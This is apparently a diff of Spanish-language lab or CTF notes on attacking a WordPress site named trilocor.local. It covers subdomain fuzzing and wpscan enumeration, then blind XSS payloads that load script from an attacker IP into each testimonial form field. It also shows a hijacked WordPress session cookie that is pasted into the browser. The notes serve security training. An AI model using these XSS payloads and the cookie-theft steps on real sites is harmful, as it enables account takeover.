@@ -4,7 +4,7 @@ hidden: true
 
 # CWES
 
-## tricolor.local
+## trilocor.local
 
 * WordPress (80)
 
@@ -17,24 +17,26 @@ ffuf -c -u http://trilocor.local/ -H 'Host: FUZZ.trilocor.local' -w /usr/share/w
 * www
 * admin
 
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
 > No olvidar poner en /etc/hosts la IP con los subdominios&#x20;
 
-## admin.tricolor.local
+## admin.trilocor.local
 
 Entramos al panel administrativo `/wp-login.php` y realizamos el siguiente comando para enumerar plugins.
 
 ```
-wpscan --url http:-/admin.trilocor.local/ --enumerate u,t,p --plugins-detection aggressive
+wpscan --url http://admin.trilocor.local/ --enumerate u,t,p --plugins-detection aggressive
 ```
 
 Entrar en **tricolor.local/index.php/testimonials/** en cada campo probar XSS.
 
-* `"><script src=http://10.10.14.118/fullname></script>`
-* `"><script src=http://10.10.14.118/company></script>`
-* `tst@tst.com`
+* `"><script src=http://10.10.14.223/fullname></script>`
+* `"><script src=http://10.10.14.223/company></script>`
+* `test@test.com`
 * `666666666`
-* `http://10.10.14.118/site`
-* `"><script src=http://10.10.14.118/comment></script>`
+* `http://10.10.14.223/site`
+* `"><script src=http://10.10.14.223/comment></script>`
 
 Ponernos en encucha.
 
@@ -90,6 +92,18 @@ sudo php -S 0.0.0.0:8000
 ```
 "><script src="http://TU_IP:8000/malicious.js"></script>
 ```
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+```
+wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1776066952%7CvL8Halvch4Sh2xreFf4KreSwfKr8WAdJdDXwbuUT0PD%7C2fdd857041823138af2efb18ac89684d797ce25388bb16b9d5fe966c1cc8397a;%20wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1776066952%7CvL8Halvch4Sh2xreFf4KreSwfKr8WAdJdDXwbuUT0PD%7Cd93128f07913a3bd07fed6d0fc4c70b11a080e9d53662d388a9747c9a18805e2;%20wordpress_test_cookie=WP%20Cookie%20check
+```
+
+Añadir en inspeccionar en cookies esos valores.
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 COOKIES
 
